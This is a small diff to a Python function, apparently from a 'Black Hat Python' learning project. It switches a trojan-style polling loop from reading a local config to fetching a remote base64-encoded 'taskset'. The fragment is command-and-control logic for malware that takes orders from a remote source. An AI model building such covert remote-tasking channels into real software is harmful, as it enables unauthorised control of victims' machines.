@@ -174,8 +174,8 @@ def GetConfig():
     while True:
         print("Attempting to receive taskset...")
         
-        #config = loads(base64.b64decode(GetFile(CONFIG_DIR))) #simplejson, base64 used
-        config = loads(ReadFile("/home/dks/Development/Python/blackhat-python/" + CONFIG_DIR))
+        config = loads(base64.b64decode(GetFile(CONFIG_DIR))) #simplejson, base64 used
+        #config = loads(ReadFile("/home/dks/Development/Python/blackhat-python/" + CONFIG_DIR))
         if(CONFIG != config):
             CONFIG = config
             print("New taskset received!")
